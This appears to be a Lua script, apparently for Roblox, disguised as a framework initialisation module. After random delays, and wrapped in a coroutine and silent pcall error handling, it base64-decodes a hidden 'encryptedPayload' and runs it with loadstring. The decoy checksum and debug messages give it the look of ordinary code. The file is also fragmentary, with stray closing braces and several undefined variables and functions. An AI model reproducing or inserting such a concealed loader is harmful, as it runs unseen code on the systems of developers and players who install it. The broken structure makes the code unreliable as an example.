local function base64Decode(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

        }
    }
    
    local checksum = 0
    for i = 1, 1000 do
        checksum = checksum + i % 256
    end
    
    if config.debugMode then
        print(string.format("[Init] Checksum: 0x%X", checksum))
        print(string.format("[Init] Loaded in %.3fms", (tick()-startTime)*1000))
    end
    
    return framework
end

local function executeMain()
    local framework = initializeFramework()
    
    local delay = math.random(50, 300) / 1000
    wait(delay)
    
    if not config.enableFeatureX then
        if config.debugMode then
            print("[Warn] FeatureX disabled by config")
        end
        return
    end
    
    local success, result = pcall(function()
        local decoded = base64Decode(encryptedPayload)
        local chunk, err = loadstring(decoded)
        if not chunk then error(err) end
        return chunk()
    end)
    
    if not success and config.debugMode then
        print("[Error] "..tostring(result))
    end
end

local function moduleEntry()
    if type(_G) ~= "table" then
        if config.debugMode then
            print("[Warn] Non-standard global environment")
        end
    end
    
    local status, err = pcall(executeMain)
    if not status and config.debugMode then
        print("[Fatal] "..tostring(err))
    end
end

local function delayedStart()
    local jitter = math.random(100, 500) / 1000
    wait(jitter)
    
    local co = coroutine.create(moduleEntry)
    local success, msg = coroutine.resume(co)
    if not success and config.debugMode then
        print("[CoError] "..tostring(msg))
    end
end

local function checkVersion()
    if config.version < "2.0.0" then
        if config.debugMode then
            print("[Deprecation] Legacy version detected")
        end
    end
end

checkVersion()
delayedStart()
